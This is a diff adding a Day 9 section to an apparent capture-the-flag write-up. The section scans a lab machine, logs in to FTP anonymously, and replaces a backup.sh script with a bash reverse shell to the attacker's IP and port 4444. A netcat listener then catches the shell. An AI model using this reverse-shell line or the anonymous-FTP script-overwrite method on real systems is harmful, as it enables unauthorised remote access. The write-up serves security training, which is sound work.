@@ -292,18 +292,76 @@ Answer
 
 ## Day 9: Anyone can be Santa!
 
+scan the target
 
+```
+nmap -A -T4 10.10.208.213
+```
 
+![image](https://user-images.githubusercontent.com/90561566/216992081-d302c2b8-f2c1-4481-b553-9d596015cf87.png)
 
+login to ftp
 
+```
+10.10.208.213
+anonymous
+binary
+ls -la
+```
 
+![image](https://user-images.githubusercontent.com/90561566/216992751-3501d7e2-756a-4f72-95f9-3239b8a8b5a1.png)
 
+```
+cd public
+ls -la
+```
 
+![image](https://user-images.githubusercontent.com/90561566/216993620-ddc00c6f-73f1-477a-8d7b-30737145621f.png)
 
+we have a backup.sh and a shoppinglist.txt
 
+```
+get backup.sh
+get shoppinglist.txt
+```
 
+let's see the backup.sh
 
+![image](https://user-images.githubusercontent.com/90561566/216993898-7faf252c-11d8-4d61-8300-2310779e89d6.png)
 
+the shopping list
+
+![image](https://user-images.githubusercontent.com/90561566/216994409-76e1f498-0435-4b38-86cc-6eaeecc2cddc.png)
+
+change content of backup file
+
+```
+bash -i >& /dev/tcp/10.9.43.204/4444 0>&1
+```
+
+![image](https://user-images.githubusercontent.com/90561566/216995036-fc113bee-2295-4ec7-b45d-8b287d663873.png)
+
+```
+put backup.sh
+```
+
+![image](https://user-images.githubusercontent.com/90561566/216995298-cb2ec0fa-dcfd-48f2-83fa-c9354085c117.png)
+
+start our listener
+
+```
+nc -vlnp 4444
+```
+
+![image](https://user-images.githubusercontent.com/90561566/216995506-b88fd190-2cf8-44e6-bfce-1e1fd9b998db.png)
+
+![image](https://user-images.githubusercontent.com/90561566/216995598-81f4a238-9ef8-43ea-81eb-d4ff9f6d8c33.png)
+
+Answer
+
+![image](https://user-images.githubusercontent.com/90561566/216995717-4af0c8d6-eba6-4f24-90cb-1cbaf426595d.png)
+
+## Day 10: Don't be sElfish!
 
 
 
